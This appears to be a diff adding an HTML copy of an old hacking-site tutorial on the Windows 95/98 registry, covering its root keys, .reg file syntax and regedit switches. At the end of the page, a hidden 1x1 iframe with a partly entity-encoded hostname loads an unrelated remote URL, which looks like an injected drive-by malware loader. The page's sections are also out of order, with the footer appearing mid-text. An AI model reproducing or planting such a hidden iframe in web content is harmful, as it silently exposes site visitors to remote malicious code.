@@ -1,0 +1,164 @@
+<html>
+<head>
+<title>The Registry Torn Apart</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#000000" text="#ffffff" link="#ffffff" vlink="#ffffff">
+<div align="center">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr>
+    <td width="693">
+      <pre>
+                        :::::::::   ::::::::  :::::::::  ::::::::::
+                        :+:    :+: :+:    :+: :+:    :+: :+:
+                        +:+    +:+ +:+        +:+    +:+ +:+
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#
+                        +#+    +#+        +#+ +#+    +#+ +#+
+                        #+#    #+# #+#    #+# #+#    #+# #+#
+                        #########   ########  ###    ### ###
+
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I   <b>The Registry Torn Apart</b>   I   Written by:     /
+    >                     I                             I                  <
+   /      <a href="mailto:black_mesa@hacktik.org">Martin L.</a>       I_____________________________I   <a href="mailto:ankit@bol.net.in">Ankit Fadia</a>     \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+</div>
+<p>&nbsp;</p>
+<p>The registry is a hierarchical database that contains virtually all information about your computer's
+configuration. Under previous version of Windows, those setting where contained in files like config.sys,
+autoexec.bat, win.ini, system.ini, control.ini and so on. From this you can understand how important the registry
+is. The structure of the registry is similar to the ini files structure, but it goes beyond the concept
+of ini files because it offers a hierarchical structure, similar to the folders and files on hard disk.
+In fact the procedure to get to the elements of the registry is similar to the way to get to folders and files.
+In this section I would be examing the Win95\98 registry only although NT is quite similar.</p>
+<h3>The Registry Editor</h3>
+<p>The Registry Editor is a utility by the filename regedit.exe that allows you to see, search, modify and save
+the registry database of Windows. The Registry Editor doesn't validate the values you are writing: it allows
+any operation. So you have to pay close attention, because no error message will be shown if you make a wrong
+operation.<br>
+To launch the Registry Editor simply run RegEdit.exe ( under WinNT run RegEdt32.exe with administer privileges).
+The registry editor is divided into two sectios in the left one there is a hierarchical structure of the database
+(the screen looks like Windows Explorer) in the right one there are the values.</p>
+<p>The registry is organized into keys and subkeys. Each key contains a value entry , each one has a name, a
+type or a class and the value itself. The name is a string that identifies the value to the key. The length and
+the format of the value is dependent on the data type.</p>
+<p>As you can see with the Registry Editor, the registry is divided into five principal keys: there is no way to add
+or delete keys at this level. Only two of these keys are effectively saved on hard disk:
+HKEY_LOCAL_MACHINE and HKEY_USERS. The others are jusr branches of the main keys or are dynamically created by Windows.</p>
+<h3>HKEY_LOCAL_MACHINE</h3>
+<p>This key contains any hardware, applications and services information. Several hardware information is
+updated automatically while the computer is booting. The data stored in this key is shared with any user. This
+handle has many subkeys:</p>
+<blockquote>
+  <p><b>Config</b><br>
+  Contains configuration data for different hardware configurations.</p>
+  <p><b>Enum</b><br>
+  This is the device data. For each device in your computer, you can find information such as the device
+  type, the hardware manufacturer, device drivers and the configuration.</p>
+  <p><b>Hardware</b><br>
+  This key contains a list of serial ports, processors and floating point processors.</p>
+  <p><b>Network</b><br>
+  Contains network information.</p>
+  <p><b>Security</b><br>
+  Shows you network security information.</p>
+  <p><b>Software</b><br>
+  This key contains data about installed software.</p>
+  <p><b>System</b><br>
+  It contains data that checks which device drivers are used by Windows and how they are configured.</p>
+</blockquote>
+<h3>HKEY_CLASSES_ROOT</h3>
+<p>This key is an alias of the branch HKEY_LOCAL_MACHINE\Software\Classes and contains OLE, drag'n'drop,
+shortcut and file association information.</p>
+<h3>HKEY_CURRENT_CONFIG</h3>
+<p>This key is also an alias. It contains a copy of the branch HKEY_LOCAL_MACHINE\Config, with the current
+computer configuration.</p>
+<h3>HKEY_DYN_DATA</h3>
+<p>Some information stored in the registry changes frequently, so Windows maintains part of the registry
+in memory instead of on the hard disk. For example it stores PnP information and computer performance. This key
+has two sub keys</p>
+<blockquote>
+  <p><b>Config Manager</b><br>
+  This key contains all hardware information problem codes, with their status. There is also the sub key
+  HKEY_LOCAL_MACHINE\Enum, but written in a different way.</p>
+  <p><b>PerfStats</b><br>
+  It contains performance data about system and network</p>
+</blockquote>
+<h3>HKEY_USERS</h3>
+<p>This important key contains the sub key .Default and another key for each user that has access to the
+computer. If there is just one user, only .Default key exists. . Each sub key maintains the preferences of each
+user, like the desktop colors, the fonts used, and also the settings of many programs. If you open a user subkey
+you will find five important subkeys:</p>
+<blockquote>
+  <p><b>AppEvent</b><br>
+  It contains the path of audio files that Windows plays when some events happen.</p>
+  <p><b>Control Panel</b><br>
+  Here are the settings defined in the Control Panel. They used to be stored in win.ini and control.ini.</p>
+  <p><b>Keyboard Layouts</b><br>
+  It contains a voice that identify the actual keyboard disposition how it is set into the Control Panel.</p>
+  <p><b>Network</b><br>
+  This key stores subkeys that describe current and recent network shortcuts.</p>
+  <p><b>RemoteAccess</b><br>
+  The settings of Remote Access are stored here.</p>
+  <p><b>Software</b><br>
+  Contains all software settings. This data was stored in win.ini and private .ini files.</p>
+</blockquote>
+<h3>HKEY_CURRENT_USER</h3>
+<p>It is an alias to current user of HKEY_USERS. If your computer is not configured for multi-users usage, it
+points to the subkey .Default of HKEY_USERS.</p>
+<h3>Description of .reg file</h3>
+<p>Here I am assuming that you already have a .reg file on your hard disk and want to know more about how it is
+structured.Now do not double click the .reg file or it's content will be added to the registry, of course there will
+be warning message that pops up. Now to view the properties of the .reg file open it in notepad.</p>
+<p>To do so first launch notepad by going to  Start &gt; Programs &gt; Accessories &gt; Notepad.<br>
+Then through the open menu open the .reg file.<br>
+Now the thing that differentiates .reg files from other files is the word REGEDIT4. It is found to be the first
+word in all .reg files. If this word is not there then the registry editor cannot recognize the file to be a .reg file.</p>
+<p>Then follows the key declaration which has to be done within square brackets and with the full path.If the key does
+not exist then it will be created.</p>
+<p>After the key declaration you will see a list of values that have to be set in the particular key in the registry.
+The values look like this:<br>
+"value name"=type:value</p>
+<p>Value name is in double commas. Type can be absent for string values, dword: for dword values and hex: for binary
+values and for all other values you have to use the code hex(#): , where # indicate the API code of the type.</p>
+</p>&nbsp;</p>
+<p><a href="mailto:ankit@bol.net.in">Ankit Fadia</a></p>
+<p>Join My mailing List for more tutorials by sending an email to<a href="mailto:programmingforhackers-subscribe@egroups.com">programmingforhackers-subscribe@egroups.com</a></p>
+
+<h4 align="center">Published on Black Sun Research Facility - <a href="http://blacksun.box.sk" target="blank">http://blacksun.box.sk</a></h4>
+<p>Important Note: expand string has API code = 2 and extended string has API code = 7.</p>
+<p>As you can see, strings are in double quotes, dword is hexadecimal and binary is a sequence of hexadecimal byte pairs,
+with a comma between each. If you want to add a back slash into a string remember to repeat it two times, so the value
+"c:\Windows" will be "c:\\Windows".</p>
+<p>Before write a new .reg file, make sure you do this else you will get an error message.</p>
+<br>
+<p><b>Command Line Registry Arguments</b></p>
+<blockquote>
+  <p>FILENAME.REG  to merge a .reg file with the registry<br>
+  /L:SYSTEM  to specify the position of SYSTEM.DAT<br>
+  /R:USER  to specify the position of USER.DAT<br>
+  /e FILENAME.REG [KEY]  to export the registry to a file. If the key is specified, the whole branch will be exported.<br>
+  /c FILENAME.REG  to substitute the entire  registry with a .reg file<br>
+  /s  to work silently, without prompt information or Warnings.</p>
+</blockquote>
+<p>That wraps up the Windows Registry.</p>
+<p><a href="mailto:ankit@bol.net.in">Ankit Fadia</a></p>
+<p>To receive more tutorials on Hacking, Perl, C++ and Viruses/Trojans join my mailing list:</p>
+<p>Send an email to <a href="mailto:programmingforhackers-subscribe@egroups.com">programmingforhackers-subscribe@egroups.com</a> to join it.</p>
+<p>Visit my Site to view all tutorials written by me at: <a href="http://www.crosswinds.net/~hackingtruths target="_blank">http://www.crosswinds.net/~hackingtruths</a></p>
+
+
+
+<h4 align="center"><a href="http://blacksun.box.sk" target="blank">http://blacksun.box.sk</a> - Black Sun Research Facility. Best tutorials on earth!</h4>
+
+
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
